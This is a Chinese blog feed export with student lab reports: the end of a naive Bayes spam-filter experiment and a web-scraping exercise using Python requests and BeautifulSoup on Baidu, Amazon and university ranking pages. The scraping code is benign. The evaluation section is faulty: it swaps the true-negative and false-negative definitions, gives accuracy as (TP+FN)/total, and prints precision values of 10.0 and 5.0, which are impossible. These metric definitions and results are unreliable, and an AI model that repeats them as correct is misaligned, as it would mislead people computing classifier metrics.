class="comment">#计算总体词向量</span></span><br><span class="line">        ham_vec, spam_vec,p_spam=traing_bayes(list_sum,cate) <span class="comment">#计算条件概率，以及先验概率</span></span><br><span class="line">        test_classify(<span class="string">"test_word.txt"</span>,features,ham_vec, spam_vec,p_spam) <span class="comment">#分类</span></span><br></pre></td></tr></table></figure>

<p>运行程序：</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200416165856310.png" alt="image-20200416165856310"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>朴素贝叶斯分类算法评价：</p>
<p><strong>查准率（Precision）、查全率（召回率）（Recall）</strong>、<strong>准确率(Accuracy)</strong></p>
<p>我们将算法预测的结果分成四种情况：</p>
<ol>
<li><p><strong>正确肯定</strong>（True Positive,TP）：预测为真，实际为真</p>
</li>
<li><p><strong>正确否定</strong>（True Negative,TN）：预测为假，实际为真</p>
</li>
<li><p><strong>错误肯定</strong>（False Positive,FP）：预测为真，实际为假</p>
</li>
<li><p><strong>错误否定</strong>（False Negative,FN）：预测为假，实际为假</p>
</li>
</ol>
<p>则：</p>
<p><strong>查准率P=TP/（TP+FP）</strong></p>
<p><strong>查全率R=TP/（TP+FN）</strong></p>
<p><strong>准确率ACC=(TP+FN) / (TP+TN+FP+FN)</strong></p>
<p>以下为去除重读词</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">去除重复词后特征项数为： 20</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.86</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.647887323943662</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">去除重复词后特征项数为： 48</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.9</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6575342465753424</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">去除重复词后特征项数为： 96</span><br><span class="line">查准率P&#x3D;TP&#x2F;（TP+FP）: 10.0</span><br><span class="line">查全率R&#x3D;TP&#x2F;（TP+FN）: 0.550561797752809</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.89</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6621621621621622</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">去除重复词后特征项数为： 142</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.92</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6666666666666666</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">去除重复词后特征项数为： 192</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.92</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6666666666666666</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">去除重复词后特征项数为： 290</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.92</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6666666666666666</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">去除重复词后特征项数为： 386</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.92</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6666666666666666</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">去除重复词后特征项数为： 578</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.93</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6666666666666666</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">去除重复词后特征项数为： 924</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.92</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6666666666666666</span><br></pre></td></tr></table></figure>

<p>可以看到调和均值F趋近于极限了，再加特征项数也无用</p>
<p>如果不去除重读词，反而会好些，最好结果如下，特征项数为150</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200416171617463.png" alt="image-20200416171617463"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">特征项数为： 75</span><br><span class="line">去除重复词后特征项数为： 150</span><br><span class="line">featuears项数： 150</span><br><span class="line">正确肯定：预测为真，实际为真 49</span><br><span class="line">正确否定：预测为假，实际为真 1</span><br><span class="line">错误肯定：预测为真，实际为假 5</span><br><span class="line">错误否定：预测为假，实际为假 45</span><br><span class="line">查准率P&#x3D;TP&#x2F;（TP+FP）: 5.0</span><br><span class="line">查全率R&#x3D;TP&#x2F;（TP+FN）: 0.5212765957446809</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.94</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6621621621621622</span><br></pre></td></tr></table></figure>

<p>错误的基本是如下6封，不过如果去除重复词那就不会有将正常邮件判断成错误邮件的情况。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第29封邮件是错误邮件————判断错误！————其实是正常邮件哒   </span><br><span class="line">正常概率VS错误概率：-44.397541630442696 -44.09868095860785</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">第64封邮件是正常邮件————判断错误！————其实是垃圾邮件哒!   </span><br><span class="line">正常概率VS错误概率：-13.513755442998768 -13.7612297041614</span><br><span class="line">第70封邮件是正常邮件————判断错误！————其实是垃圾邮件哒!   </span><br><span class="line">正常概率VS错误概率：-13.513755442998768 -13.7612297041614</span><br><span class="line">第73封邮件是正常邮件————判断错误！————其实是垃圾邮件哒!   </span><br><span class="line">正常概率VS错误概率：-6.9073094336244685 -6.939395461206766</span><br><span class="line">第92封邮件是正常邮件————判断错误！————其实是垃圾邮件哒!   </span><br><span class="line">正常概率VS错误概率：-54.79272850055003 -55.26584135501914</span><br><span class="line">第94封邮件是正常邮件————判断错误！————其实是垃圾邮件哒!   </span><br><span class="line">正常概率VS错误概率：-54.79272850055003 -55.26584135501914</span><br></pre></td></tr></table></figure>

<p>其中70\73都比较特殊，其邮件字数都很少，难以分类成功</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200416172425856.png" alt="image-20200416172425856"></p>
<p>理论上来说，对于贝叶斯而言：</p>
<p><strong>主要优点</strong>有：</p>
<p>1）朴素贝叶斯模型发源于古典数学理论，有稳定的分类效率。 </p>
<p>2）对小规模的数据表现很好，能个处理多分类任务，适合增量式训练，尤其是数据量超出内存时，我们可以一批批的去增量训练。 </p>
<p>3）对缺失数据不太敏感，算法也比较简单，常用于文本分类。</p>
<p><strong>主要缺点</strong>有：</p>
<p>1） 理论上，朴素贝叶斯模型与其他分类方法相比具有最小的误差率。但是实际上并非总是如此，这是因为朴素贝叶斯模型给定输出类别的情况下，假设属性之间相互独立，这个假设在实际应用中往往是不成立的，在属性个数比较多或者属性之间相关性较大时，分类效果不好。而在属性相关性较小时，朴素贝叶斯性能最为良好。对于这一点，有半朴素贝叶斯之类的算法通过考虑部分关联性适度改进。 </p>
<p>2）需要知道先验概率，且先验概率很多时候取决于假设，假设的模型可以有很多种，因此在某些时候会由于假设的先验模型的原因导致预测效果不佳。 </p>
<p>3）由于我们是通过先验和数据来决定后验的概率从而决定分类，所以分类决策存在一定的错误率。 </p>
<p>4）对输入数据的表达形式很敏感。</p>
<p>而综合实验：</p>
<p>对于邮件分类任务而言，贝叶斯确实蛮稳的，在如此少量的数据集中，有稳定的、有效的分类效率，对小规模的数据表现很好。</p>
<p>而其在这个数据集中的准确率ACC最高可达94%，基本无法再提高。</p>
<p>我个人认为原因主要有如下几点：</p>
<ul>
<li>训练集不够多，不够贴近实际</li>
<li>测试集存在特殊情况，如邮件极短、邮件较独特等</li>
<li>用于训练的特征项数，我上面的实验已经得出了结论</li>
</ul>
<h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>这次的实验还是收获很多的：</p>
<ul>
<li>学会了使用jieba库进行分词，提取特征词</li>
<li>学会了使用gensim进行word2vec词向量话</li>
<li>最大的收获是，自己实操，对贝叶斯算法进行了一次深入的尝试，很愉悦~</li>
<li>对文本分类的流程、机器学习的理解更深了</li>
</ul>
]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-03-25-information-security-exp-1</title>
    <url>/2020/03/25/2020-03-25-information-security-exp-1/</url>
    <content><![CDATA[<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403231659299.png" alt="image-20200403231659299"></p>
<a id="more"></a>

<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403140353613.png" alt="image-20200403140353613"></p>
<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>IDE：pycharm</p>
<p>python版本：anacoda-&gt;python3.7</p>
<h1 id="实验1-1-requests库"><a href="#实验1-1-requests库" class="headerlink" title="实验1.1-requests库"></a>实验1.1-requests库</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200327164527042.png" alt="image-20200327164527042"></p>
<p>安装requests库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160841956.png" alt="image-20200402160841956"></p>
<h2 id="1-获取状态码"><a href="#1-获取状态码" class="headerlink" title="1.获取状态码"></a>1.获取状态码</h2><p>配置Python环境，使用通用代码框架爬取网站，并获取状态码。 爬取网址请自行选择。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.get(url,timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()  <span class="comment"># 如果状态不是200，引发error异常</span></span><br><span class="line">        r.encoding=r.apparent_encoding <span class="comment">#获取网页正确的编码格式</span></span><br><span class="line">        <span class="keyword">return</span> r.status_code  <span class="comment">#返回状态码</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"产生异常"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    url=<span class="string">"https://www.baidu.com/"</span></span><br><span class="line">    print(getHTMLText(url))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160846431.png" alt="image-20200402160846431"></p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160853276.png" alt="image-20200402160853276"></p>
<h2 id="2-使用post-方法"><a href="#2-使用post-方法" class="headerlink" title="2.使用post()方法"></a>2.使用post()方法</h2><p>使用requests库中的post()方法，向<a href="http://httpbin.org/post" target="_blank" rel="noopener">http://httpbin.org/post</a> 增加字段，其中your_name和ID，请使用自己的姓名及学号。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = &#123;<span class="string">'name'</span>: <span class="string">'LFL'</span>, <span class="string">'ID'</span>: <span class="string">'2017301500076'</span>&#125;</span><br><span class="line">r=requests.post(<span class="string">"http://httpbin.org/post"</span>, data=payload)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160901843.png" alt="image-20200402160901843"></p>
<h2 id="3-实例1-2-3-4"><a href="#3-实例1-2-3-4" class="headerlink" title="3.实例1/2/3/4"></a>3.实例1/2/3/4</h2><p>完成实例1/2/3/4，其中实例1中的浏览器版本、实例2中搜索关键、实例3中下载图片、实例4 中的IP地址请自行选择。</p>
<h3 id="1-亚马逊网站商品页面爬取"><a href="#1-亚马逊网站商品页面爬取" class="headerlink" title="1-亚马逊网站商品页面爬取"></a>1-亚马逊网站商品页面爬取</h3><p>直接访问亚马逊会返回503访问异常错误</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160906535.png" alt="image-20200402160906535"></p>
<p>所以在头部加上浏览器版本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">hd=&#123;<span class="string">'user-agent'</span>:<span class="string">'Chrome/66.0'</span>&#125;</span><br><span class="line"><span class="comment"># r=requests.request('post','https://www.amazon.com/',headers=hd)</span></span><br><span class="line">r=requests.get(<span class="string">"https://www.amazon.com"</span>,headers=hd)</span><br><span class="line">print(r.status_code)</span><br></pre></td></tr></table></figure>

<p>返回码200正确</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160911519.png" alt="image-20200402160911519"></p>
<h3 id="2-搜索引擎搜索关键词提交"><a href="#2-搜索引擎搜索关键词提交" class="headerlink" title="2-搜索引擎搜索关键词提交"></a>2-搜索引擎搜索关键词提交</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instance_2</span><span class="params">()</span>:</span></span><br><span class="line">    keyword = <span class="string">"WHU"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        kv = &#123;<span class="string">'wd'</span>: keyword,<span class="string">'user-agent'</span>:<span class="string">'Chrome/66.0'</span>&#125;</span><br><span class="line">        r = requests.get(<span class="string">"http://www.baidu.com/s"</span>,params=kv)</span><br><span class="line">        print(r.request.url)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        print(r.text[<span class="number">1</span>:<span class="number">1000</span>])</span><br><span class="line">    <span class="comment"># 结果太长，打印前1000个字符</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"爬取失败"</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    instance_2()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160916924.png" alt="image-20200402160916924"></p>
<h3 id="3-网络图片的爬取和存储"><a href="#3-网络图片的爬取和存储" class="headerlink" title="3-网络图片的爬取和存储"></a>3-网络图片的爬取和存储</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instance_3</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line">    <span class="keyword">import</span> os  <span class="comment"># OS库提供了使用各种操作系统功能的接口。</span></span><br><span class="line">    url = <span class="string">"https://colalinn.github.io/2020/02/28/2020-02-28-algorithm-class/image-20200228174457509.png"</span></span><br><span class="line">    root = <span class="string">""</span></span><br><span class="line">    path = root + url.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(root):</span><br><span class="line">            print(<span class="string">"就是py下的目录啦！"</span>)</span><br><span class="line">            <span class="comment"># os.mkdir(root)  # 用于以数字权限模式创建目录</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            print(<span class="string">"客官文件不存在哦,我们保存一下！"</span>)</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            <span class="keyword">with</span> open(path, <span class="string">'wb'</span>)<span class="keyword">as</span> f:</span><br><span class="line">                f.write(r.content)</span><br><span class="line">                f.close()</span><br><span class="line">                print(<span class="string">"文件保存成功"</span>)</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 写代码时注意缩进</span></span><br><span class="line">            print(<span class="string">"文件已存在"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"爬取失败"</span>)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    instance_3()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160921928.png" alt="image-20200402160921928"></p>
<h3 id="4-ip地址的查询"><a href="#4-ip地址的查询" class="headerlink" title="4-ip地址的查询"></a>4-ip地址的查询</h3><p>原ppt链接的网站会有一个弹窗，这里暂不改动</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instance_4</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line">    <span class="comment"># url="http://www.ip138.com/ips138.asp?ip=" #这个链接不能用了</span></span><br><span class="line">    url = <span class="string">"https://ipchaxun.com/"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        hd = &#123;<span class="string">'user-agent'</span>: <span class="string">'Chrome/66.0'</span>&#125;</span><br><span class="line">        r = requests.get(url + <span class="string">'220.181.38.148'</span>,headers=hd)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        print(r.text[<span class="number">1900</span>:<span class="number">2400</span>])  <span class="comment"># 输出最后2000个字符</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"爬取失败"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    instance_4()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402161147165.png" alt="image-20200402161147165"></p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402161207830.png" alt="image-20200402161207830"></p>
<h1 id="实验1-2-BeautifulSoup库"><a href="#实验1-2-BeautifulSoup库" class="headerlink" title="实验1.2-BeautifulSoup库"></a>实验1.2-BeautifulSoup库</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>BeautifulSoup 是一个可以从HTML或XML文件中提取数据的Python库.它能够通过转换器实现文档导航、查找、修改。</p>
<p>安装        </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install beautifulsoup4</span><br></pre></td></tr></table></figure>

<p>解析器</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402161235158.png" alt="image-20200402161235158"></p>
<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><ul>
<li>参考实例2，爬取百度搜索风云榜 <a href="http://top.baidu.com/" target="_blank" rel="noopener">http://top.baidu.com/</a> 任一榜单，搜索结果按顺序逐行输出（含编号），榜单自选。</li>
<li>自行编码完成实例3，并回答思考题。</li>
<li>爬取当当图书排行榜（榜单自选），格式：爬取结果包含但不限于[排名 书名 作者]， 注意输出格式对齐。</li>
</ul>
<h2 id="1-爬取百度搜索风云榜"><a href="#1-爬取百度搜索风云榜" class="headerlink" title="1-爬取百度搜索风云榜"></a>1-爬取百度搜索风云榜</h2><p>使用审查可以看到百度搜索风云榜的标签都是a标签，属性是“list-title”</p>
<p>所以我们使用以下方式即可获取所有人物串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">soup.find_all(<span class="string">'a'</span>, <span class="string">'list-title'</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402161241441.png" alt="image-20200402161241441"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instance_2</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.get(<span class="string">"http://top.baidu.com/buzz?b=257&amp;fr=topboards"</span>)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    demo = r.text</span><br><span class="line">    soup = BeautifulSoup(demo, <span class="string">'html.parser'</span>)</span><br><span class="line">    ulist = []</span><br><span class="line">    <span class="keyword">for</span> tag <span class="keyword">in</span> soup.find_all(<span class="string">'a'</span>, <span class="string">'list-title'</span>):</span><br><span class="line">        ulist.append(tag.string)  <span class="comment"># Xlist.append()在列表X尾部增加一个新的元素</span></span><br><span class="line">        print(ulist.index(tag.string) + <span class="number">1</span>, ulist[ulist.index(tag.string)])</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># instance_1()</span></span><br><span class="line">    instance_2()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160825591.png" alt="image-20200402160825591"></p>
<h2 id="2-爬取中国大学排行榜-扩展"><a href="#2-爬取中国大学排行榜-扩展" class="headerlink" title="2-爬取中国大学排行榜+扩展"></a>2-爬取中国大学排行榜+扩展</h2><p>一开始我们的代码如下，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillUnivList</span><span class="params">(ulist, html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)</span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">'tbody'</span>).children:</span><br><span class="line">        <span class="keyword">if</span> isinstance(tr, bs4.element.Tag):</span><br><span class="line">            tds = tr(<span class="string">'td'</span>)</span><br><span class="line">            ulist.append([tr.td.string, tds[<span class="number">1</span>].string, tds[<span class="number">3</span>].string])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printUnivList</span><span class="params">(ulist, num)</span>:</span></span><br><span class="line">    print(<span class="string">"&#123;:^10&#125;\t&#123;:^6&#125;\t&#123;:^10&#125;"</span>.format(<span class="string">"排名"</span>, <span class="string">"学校名称"</span>, <span class="string">"总分"</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        u = ulist[i]</span><br><span class="line">        print(<span class="string">"&#123;:^10&#125;\t&#123;:^6&#125;\t&#123;:^10&#125;"</span>.format(u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>]))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instance_3</span><span class="params">()</span>:</span></span><br><span class="line">    uinfo = []</span><br><span class="line">    url = <span class="string">'http://www.zuihaodaxue.cn/zuihaodaxuepaiming2016.html'</span></span><br><span class="line">    html = getHTMLText(url)</span><br><span class="line">    fillUnivList(uinfo, html)</span><br><span class="line">    printUnivList(uinfo, <span class="number">20</span>)  <span class="comment"># 20 univs</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    instance_3()</span><br></pre></td></tr></table></figure>

<p>结果是不对齐的，这是因为当中文字符宽度不够时，采用西文字符填充；中西文字符占用宽度不同</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402162153169.png" alt="image-20200402162153169"></p>
<p>之后我们将printUnivList函数改成如下，排列对齐了</p>
<p>tplt为定义的输出格式模板变量：</p>
<ul>
<li>^代表居中</li>
<li>4/12/10代表输出宽度（当输出数据超过该数字时，以实际输出为准）</li>
<li>{3}代表打印输出时，我们使用chr(12288)中文空格对齐（全角Unicode空格）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printUnivList_A</span><span class="params">(ulist, num)</span>:</span></span><br><span class="line">    tplt = <span class="string">"&#123;0:^4&#125;\t&#123;1:&#123;3&#125;^12&#125;\t&#123;2:^10&#125;"</span></span><br><span class="line">    print(tplt.format(<span class="string">"排名"</span>, <span class="string">"学校名称"</span>, <span class="string">"总分"</span>, chr(<span class="number">12288</span>)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        u = ulist[i]</span><br><span class="line">        print(tplt.format(u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>], chr(<span class="number">12288</span>)))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402162058589.png" alt="image-20200402162058589"></p>
<h3 id="扩展1-url改为2017"><a href="#扩展1-url改为2017" class="headerlink" title="扩展1-url改为2017"></a>扩展1-url改为2017</h3><p>将实例2中url改为软科中国最好大学排名2017？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">'http://www.zuihaodaxue.cn/zuihaodaxuepaiming2017.html'</span></span><br></pre></td></tr></table></figure>

<p>会报错 <code>排名</code>找不到</p>
<p>我们将ulist打印出来，发现排名为none，说明没有获取到排名的值</p>
<p>而我在chrome上审查，2017和2016的排名处格式是相同的</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402164344702.png" alt="image-20200402164344702"></p>
<p>而在代码中使用<code>soup.prettify()</code>打印出来代码后发现排名处格式没有<code>&lt;td&gt;&lt;/td&gt;</code>的闭合，这里估计是用了javascript渲染时做了手脚使得td标签变了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)</span><br><span class="line">print(soup.prettify())</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402164103572.png" alt="image-20200402164103572"></p>
<p>由图上可知，第一个td标签包含了所有内容，包括排名，所以无法通过<code>tds[0]</code>找到</p>
<p>解决方案：</p>
<p>使用contends</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tds[<span class="number">0</span>].contents[<span class="number">0</span>]   <span class="comment">#这个就是排名了</span></span><br><span class="line">tds[<span class="number">0</span>].get_text(<span class="string">" "</span>).split(<span class="string">" "</span>)[<span class="number">0</span>]  <span class="comment">#这个也可以,get_text()清空所有html标签元素</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402183232902.png" alt="image-20200402183232902"></p>
<p>总代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillUnivList</span><span class="params">(ulist, html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)</span><br><span class="line">    <span class="comment"># print(soup.prettify())</span></span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">'tbody'</span>).children:</span><br><span class="line">        <span class="keyword">if</span> isinstance(tr, bs4.element.Tag):</span><br><span class="line">            tds = tr(<span class="string">'td'</span>)</span><br><span class="line">            <span class="comment"># tds[0].get_text(" ").split(" ")[0]也可以</span></span><br><span class="line">            ulist.append([tds[<span class="number">0</span>].contents[<span class="number">0</span>], tds[<span class="number">1</span>].string, tds[<span class="number">3</span>].string])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printUnivList_A</span><span class="params">(ulist, num)</span>:</span></span><br><span class="line">    tplt = <span class="string">"&#123;0:^4&#125;\t&#123;1:&#123;3&#125;^12&#125;\t&#123;2:^10&#125;"</span></span><br><span class="line">    print(tplt.format(<span class="string">"排名"</span>, <span class="string">"学校名称"</span>, <span class="string">"总分"</span>, chr(<span class="number">12288</span>)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        u = ulist[i]</span><br><span class="line">        print(tplt.format(u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>], chr(<span class="number">12288</span>)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instance_3</span><span class="params">()</span>:</span></span><br><span class="line">    uinfo = []</span><br><span class="line">    url = <span class="string">'http://www.zuihaodaxue.cn/zuihaodaxuepaiming2017.html'</span></span><br><span class="line">    html = getHTMLText(url)</span><br><span class="line">    fillUnivList(uinfo, html)</span><br><span class="line">    printUnivList_A(uinfo, <span class="number">20</span>)  <span class="comment"># 20 univs</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    instance_3()</span><br></pre></td></tr></table></figure>

<p>最终结果</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402183419220.png" alt="image-20200402183419220"></p>
<h3 id="扩展2-url改为软科排名2016"><a href="#扩展2-url改为软科排名2016" class="headerlink" title="扩展2-url改为软科排名2016"></a>扩展2-url改为软科排名2016</h3><p>将实例2中url改为软科世界大学学术排名 2016：<a href="http://www.zuihaodaxue.cn/ARWU2016.html" target="_blank" rel="noopener">http://www.zuihaodaxue.cn/ARWU2016.html</a><br>该如何修改代码？</p>
<p>可以看到没有多大的变化，只是大学名、国家\地区有些不同    </p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402165756192.png" alt="image-20200402165756192"></p>
<p>对之前的代码稍加修改可得结果</p>
